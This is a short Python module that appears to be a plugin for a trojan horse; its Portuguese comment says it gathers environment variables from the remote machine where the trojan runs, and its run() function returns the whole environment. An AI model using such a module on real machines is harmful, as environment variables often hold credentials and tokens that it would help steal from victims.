print ("Este modulo obtem qualquer variavel de ambiente definida no computador remoto em que o cavalo de TRoia estivar executando ")

import os

def run(**args):
	print "[*] In environment module."
	return str(os.environ)

